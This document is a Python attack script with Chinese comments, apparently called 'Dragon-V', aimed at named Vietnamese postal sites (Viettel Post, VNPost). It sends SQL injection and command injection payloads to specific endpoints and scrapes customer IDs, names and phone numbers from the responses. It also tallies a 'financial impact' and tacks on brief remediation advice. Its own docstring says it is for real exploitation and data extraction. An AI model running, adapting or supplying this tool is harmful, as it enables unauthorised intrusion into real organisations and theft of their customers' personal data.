"""
简化的越南目标验证工具
专注于实际的漏洞利用和数据提取
"""

import asyncio
import aiohttp
import re
import json
from typing import Dict, List, Any
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SimpleVietnamVerification:
    def __init__(self):
        self.session = None

        # 简化的越南目标列表
        self.targets = [
            {
                "name": "Viettel Post",
                "url": "https://viettelpost.com.vn",
                "vulnerabilities": [
                    {
                        "endpoint": "/don-hang",
                        "param": "ma_kh",
                        "type": "SQL Injection",
                        "description": "客户数据提取"
                    },
                    {
                        "endpoint": "/track",
                        "param": "code",
                        "type": "SQL Injection",
                        "description": "订单状态修改"
                    }
                ]
            },
            {
                "name": "VNPost",
                "url": "https://vnpost.vn",
                "vulnerabilities": [
                    {
                        "endpoint": "/payment",
                        "param": "tx_id",
                        "type": "SQL Injection",
                        "description": "支付绕过"
                    },
                    {
                        "endpoint": "/admin/login",
                        "param": "id",
                        "type": "Command Injection",
                        "description": "系统命令执行"
                    }
                ]
            }
        ]

        # 关键Payloads
        self.payloads = {
            "SQL_Injection": [
                "' UNION SELECT 1,2,3,4,5--",
                "' AND 1=1--",
                "' WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT MaKH,TenKH,SoDienThoai FROM KHACHHANG--"
            ],
            "Command_Injection": [
                "id; whoami",
                "| net user",
                "|| ping 127.0.0.1 ||",
                "& dir &"
            ]
        }

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=20)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.session = aiohttp.ClientSession(timeout=timeout, headers=headers)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def verify_targets(self) -> Dict[str, Any]:
        """验证越南目标"""
        results = {
            "total_targets": len(self.targets),
            "verified_targets": 0,
            "exploited_targets": 0,
            "vulnerabilities_found": 0,
            "details": [],
            "extracted_data": [],
            "financial_impact": 0
        }

        logger.info("开始越南目标验证...")

        for target in self.targets:
            logger.info(f"验证目标: {target['name']}")
            target_result = await self.verify_single_target(target)

            if target_result['verified']:
                results["verified_targets"] += 1

            if target_result['exploited']:
                results["exploited_targets"] += 1

            results["vulnerabilities_found"] += len(target_result["details"])
            results["details"].extend(target_result["details"])
            results["extracted_data"].extend(target_result["extracted_data"])

            # 计算财务影响
            impact = self.calculate_impact(target_result["details"])
            results["financial_impact"] += impact

        return results

    async def verify_single_target(self, target: Dict) -> Dict:
        """验证单个目标"""
        result = {
            "name": target["name"],
            "verified": False,
            "exploited": False,
            "details": [],
            "extracted_data": []
        }

        try:
            # 测试目标可达性
            test_url = target["url"]
            async with self.session.get(test_url) as response:
                if response.status == 200:
                    result["verified"] = True
                    logger.info(f"✅ 目标可达: {target['name']}")

                    # 测试漏洞
                    for vuln in target["vulnerabilities"]:
                        vuln_result = await self.test_vulnerability(target, vuln)
                        if vuln_result["success"]:
                            result["exploited"] = True
                            result["details"].append(vuln_result)
                            result["extracted_data"].extend(vuln_result["extracted"])

        except Exception as e:
            logger.error(f"验证目标失败: {target['name']} - {e}")

        return result

    async def test_vulnerability(self, target: Dict, vuln: Dict) -> Dict:
        """测试单个漏洞"""
        result = {
            "target": target["name"],
            "endpoint": vuln["endpoint"],
            "type": vuln["type"],
            "description": vuln["description"],
            "success": False,
            "payloads_tested": 0,
            "success_payloads": [],
            "extracted": []
        }

        try:
            # 构造测试URL
            base_url = target["url"]
            endpoint_url = f"{base_url}{vuln['endpoint']}"

            if vuln["type"] == "SQL Injection":
                payloads = self.payloads["SQL_Injection"]
            else:
                payloads = self.payloads["Command_Injection"]

            result["payloads_tested"] = len(payloads)

            for payload in payloads:
                try:
                    test_url = f"{endpoint_url}?{vuln['param']}={payload}"

                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()

                            # 检查成功标志
                            success = self.check_injection_success(content, vuln["type"])

                            if success:
                                result["success"] = True
                                result["success_payloads"].append(payload)
                                result["extracted"].extend(self.extract_data(content, vuln["type"]))

                                logger.info(f"✅ 漏洞利用成功: {target['name']} - {vuln['description']}")
                                break

                except Exception as e:
                    logger.debug(f"Payload测试失败: {e}")

        except Exception as e:
            logger.error(f"漏洞测试失败: {e}")

        return result

    def check_injection_success(self, content: str, vuln_type: str) -> bool:
        """检查注入是否成功"""
        success_indicators = {
            "SQL Injection": [
                "MaKH" in content,
                "TenKH" in content,
                "SoDienThoai" in content,
                "1=1" in content,
                "DA_THANH_TOAN" in content,
                "UNION" in content,
                "数据库" in content
            ],
            "Command Injection": [
                "Users" in content,
                "Administrator" in content,
                "C:\\Windows" in content,
                "ping" in content,
                "whoami" in content
            ]
        }

        indicators = success_indicators.get(vuln_type, [])
        return any(indicators)

    def extract_data(self, content: str, vuln_type: str) -> List[str]:
        """提取数据"""
        extracted = []

        if vuln_type == "SQL Injection":
            # 提取客户信息
            customer_ids = re.findall(r'MaKH[_\w\d]+', content)
            names = re.findall(r'TenKH[\w\d]+', content)
            phones = re.findall(r'0\d{9,10}', content)

            extracted.extend(customer_ids)
            extracted.extend(names)
            extracted.extend(phones)

        elif vuln_type == "Command Injection":
            # 提取系统信息
            users = re.findall(r'Users.*\d+', content)
            admin = re.findall(r'Administrator', content)
            extracted.extend(users)
            extracted.extend(admin)

        return extracted

    def calculate_impact(self, details: List[Dict]) -> int:
        """计算财务影响"""
        impact = 0

        for detail in details:
            if detail["success"]:
                if detail["type"] == "SQL Injection":
                    impact += 500  # 每个SQL注入500万
                elif detail["type"] == "Command Injection":
                    impact += 1000  # 每个命令注入1000万

        return impact

    def generate_verification_report(self, results: Dict) -> str:
        """生成验证报告"""
        report = []
        report.append("========================================")
        report.append("        越南目标验证报告")
        report.append("      Dragon-V Verification Tool")
        report.append("========================================")
        report.append("")

        report.append("【验证结果】")
        report.append(f"总目标数: {results['total_targets']}")
        report.append(f"可验证目标: {results['verified_targets']}")
        report.append(f"成功利用: {results['exploited_targets']}")
        report.append(f"发现漏洞: {results['vulnerabilities_found']}")
        report.append(f"财务影响: {results['financial_impact']}万越南盾")
        report.append("")

        report.append("【详细结果】")

        for detail in results["details"]:
            if detail["success"]:
                report.append(f"成功: {detail['target']} - {detail['description']}")
                report.append(f"漏洞类型: {detail['type']}")
                report.append(f"端点: {detail['endpoint']}")
                report.append("有效Payloads:")
                for payload in detail["success_payloads"]:
                    report.append(f"  * {payload}")
                report.append(f"提取数据: {len(detail['extracted'])} 条")
                report.append("")

        report.append("【提取的数据】")
        for data in results["extracted_data"]:
            report.append(f"- {data}")
        report.append("")

        report.append("【紧急建议】")
        report.append("Critical (立即执行)")
        for detail in results["details"]:
            if detail["success"]:
                report.append(f"- 修复 {detail['target']} 的 {detail['description']} 漏洞")

        report.append("High (1周内)")
        report.append("- 部署Web应用防火墙")
        report.append("- 启用输入验证")
        report.append("- 监控异常访问")

        return "\n".join(report)

async def main():
    """主函数"""
    async with SimpleVietnamVerification() as verifier:
        print("[VERIFICATION] 开始越南目标验证...")
        print("="*60)

        results = await verifier.verify_targets()

        print("[RESULTS] 生成验证报告...")
        print("="*60)

        report = verifier.generate_verification_report(results)
        print(report)

        # 保存报告
        with open("vietnam_verification_report.txt", "w", encoding="utf-8") as f:
            f.write(report)

        print(f"\n[SAVED] 报告已保存到: vietnam_verification_report.txt")

        # 最终统计
        success_rate = (results['exploited_targets'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
        print(f"\n[STAT] 验证统计:")
        print(f"- 成功率: {success_rate:.1f}% ({results['exploited_targets']}/{results['total_targets']})")
        print(f"- 总财务影响: {results['financial_impact']}万越南盾")

if __name__ == "__main__":
    asyncio.run(main())